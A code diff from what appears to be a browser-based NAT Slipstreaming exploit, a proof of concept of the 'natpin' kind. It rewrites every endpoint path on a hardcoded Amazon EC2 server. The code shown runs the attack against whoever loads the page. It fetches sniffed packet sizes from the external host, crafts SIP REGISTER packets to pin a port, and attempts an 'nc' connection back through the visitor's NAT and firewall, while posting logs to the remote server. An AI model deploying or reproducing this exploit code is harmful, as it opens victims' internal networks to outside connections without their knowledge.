@@ -355,7 +355,7 @@ function getSize()
 {
 	var scr = document.createElement('script')
 	scr.type = 'text/javascript'
-	scr.src = '//ec2-3-17-135-238.us-east-2.compute.amazonaws.com/natpin/get_size?id=' + rand + '&rand=' + rnd()
+	scr.src = '//ec2-3-17-135-238.us-east-2.compute.amazonaws.com/get_size?id=' + rand + '&rand=' + rnd()
 	log('requesting sniffed packet sizes from server')
 	document.head.appendChild(scr)
 }
@@ -443,7 +443,7 @@ function offset(off, data, origoff)
 				lastOff = off
 
 			log("packet size changed on us, reattempt SIP REGISTER")
-			addScript('//ec2-3-17-135-238.us-east-2.compute.amazonaws.com/natpin/monitor?id=' + rand + '&port=' + port + '&rnd=' + rnd())
+			addScript('//ec2-3-17-135-238.us-east-2.compute.amazonaws.com/monitor?id=' + rand + '&port=' + port + '&rnd=' + rnd())
 			attemptPin(fullpkt)
 		}
 	}
@@ -480,7 +480,7 @@ function tryConnect()
 {
 	log('running: nc -v <?php echo getenv('REMOTE_ADDR') ?> ' + port)
 	log('\n<b>attempting to bypass your NAT/firewall</b>')
-	addScript('//ec2-3-17-135-238.us-east-2.compute.amazonaws.com/natpin/connect?id=' + rand + '&port=' + port)
+	addScript('//ec2-3-17-135-238.us-east-2.compute.amazonaws.com/connect?id=' + rand + '&port=' + port)
 }
 
 // called from /connect (along with some log()s)
@@ -573,7 +573,7 @@ function runpin()
 	fullpkt = s
 
 	// get our sip request from the server, calls offset() if good, otherwise noRespTimer will likely hit
-	addScript('//ec2-3-17-135-238.us-east-2.compute.amazonaws.com/natpin/monitor?id=' + rand + '&port=' + port + '&rnd=' + rnd())
+	addScript('//ec2-3-17-135-238.us-east-2.compute.amazonaws.com/monitor?id=' + rand + '&port=' + port + '&rnd=' + rnd())
 
 	// if we don't get request in a few seconds, something wrong...maybe wrong internal ip if safari
 	noRespTimer = setTimeout(noResponse, 5000)
@@ -720,7 +720,7 @@ function go(type)
 
 function nlog(str)
 {
-	post('//ec2-3-17-135-238.us-east-2.compute.amazonaws.com/natpin/nlog', str)
+	post('//ec2-3-17-135-238.us-east-2.compute.amazonaws.com/nlog', str)
 }
 function gather(sc)
 {
